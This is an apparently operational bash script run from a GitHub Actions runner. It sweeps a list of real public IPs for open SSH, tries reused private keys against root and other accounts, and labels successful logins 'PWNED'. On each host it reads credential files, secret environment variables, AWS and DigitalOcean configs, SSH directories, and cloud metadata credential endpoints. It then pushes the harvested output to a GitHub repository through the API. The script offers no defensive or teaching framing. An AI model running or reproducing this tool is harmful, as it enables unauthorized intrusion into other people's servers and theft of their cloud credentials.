#!/bin/bash
# i724 v2: parallel SSH reuse sweep from GitHub-hosted runner
set +e
chmod 600 keys/k_ali keys/k_id25519 2>/dev/null
: > i724v2_out.txt
echo "RUNNER=$(hostname) EGRESS=$(curl -s -m 10 https://ifconfig.me)" | tee -a i724v2_out.txt

{ cat ips.txt; awk -F'\t' '{print $2}' az/hosts.tsv; cat i724/ali_ips.txt 2>/dev/null; \
  echo 104.248.81.108; echo 142.93.229.199; echo 159.65.193.67; echo 167.99.214.167; \
  echo 192.241.189.34; echo 64.227.68.177; echo 159.223.208.147; } | grep -E '^[0-9]+(\.[0-9]+){3}$' | sort -u > i724v2_cand.txt
echo "cand=$(wc -l < i724v2_cand.txt)"

chk(){ ip="$1"; timeout 3 bash -c "exec 3<>/dev/tcp/$ip/22" 2>/dev/null && echo "$ip"; }
export -f chk
cat i724v2_cand.txt | xargs -P 100 -I{} bash -c 'chk {}' | sort > i724v2_open.txt
echo "open22=$(wc -l < i724v2_open.txt)" | tee -a i724v2_out.txt
cat i724v2_open.txt >> i724v2_out.txt

CMD='echo LOGIN_OK uid=$(id -u) host=$(hostname) ip=$(hostname -I 2>/dev/null); echo "--- ulv"; ls -la /root/ulv 2>/dev/null | head -20; sed -n "1,80p" /root/ulv/creds.env 2>/dev/null; echo "--- envmatch"; env | grep -iE "DO_|DIGITAL|AWS_|ALI_|TENCENT|HUAWEI|TOKEN|KEY|SECRET" | head -30; echo "--- doctl"; cat /root/.config/doctl/config.yaml 2>/dev/null | head -10; echo "--- aws"; cat /root/.aws/credentials 2>/dev/null | head -20; echo "--- ssh"; ls -la /root/.ssh 2>/dev/null | head; echo "--- etc"; cat /etc/ul/creds.env 2>/dev/null | head -20; echo "--- gpu"; nvidia-smi -L 2>/dev/null | head -10; echo "--- imds_ali"; curl -s -m 5 http://100.100.100.200/latest/meta-data/ram/security-credentials/ 2>/dev/null; echo; echo "--- imds_aws"; curl -s -m 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null; echo END'

tryip(){
  ip="$1"
  for u in root t19 ubuntu admin ec2-user; do
    for kf in keys/k_ali keys/k_id25519; do
      out=$(timeout 20 ssh -i "$kf" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=5 -o NumberOfPasswordPrompts=0 -o PreferredAuthentications=publickey -o LogLevel=ERROR "$u@$ip" "$CMD" 2>&1 | head -70)
      echo "TRY $ip $u $(basename $kf) => $(echo "$out" | head -1)" >> i724v2_out.txt
      case "$out" in *LOGIN_OK*) echo "=== PWNED $ip $u $(basename $kf)" >> i724v2_out.txt; echo "$out" >> i724v2_out.txt;; esac
    done
  done
}
export -f tryip; export CMD
cat i724v2_open.txt | xargs -P 32 -I{} bash -c 'tryip {}'

echo "=== LOGINS ===" | tee -a i724v2_out.txt
grep -c '^=== PWNED' i724v2_out.txt

GH="${GH_PAT:-}"
if [ -n "$GH" ]; then
  b64=$(base64 -w0 i724v2_out.txt)
  SHA=$(curl -s -m 20 -H "Authorization: Bearer $GH" -H 'User-Agent: i724' \
    "https://api.github.com/repos/dongsuju/ul-plant/contents/i724/result2.txt" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("sha") or "")
except: print("")')
  python3 - "$b64" "$SHA" <<'PYEOF' > /tmp/body2.json
import json,sys
b,s=sys.argv[1],sys.argv[2]
o={"message":"i724v2 sweep","content":b,"branch":"main"}
if s: o["sha"]=s
print(json.dumps(o))
PYEOF
  curl -s -m 40 -X PUT -H "Authorization: Bearer $GH" -H 'User-Agent: i724' -H 'Content-Type: application/json' \
    --data @/tmp/body2.json "https://api.github.com/repos/dongsuju/ul-plant/contents/i724/result2.txt" -o /tmp/put2.json -w 'PUT2 %{http_code}\n'
fi
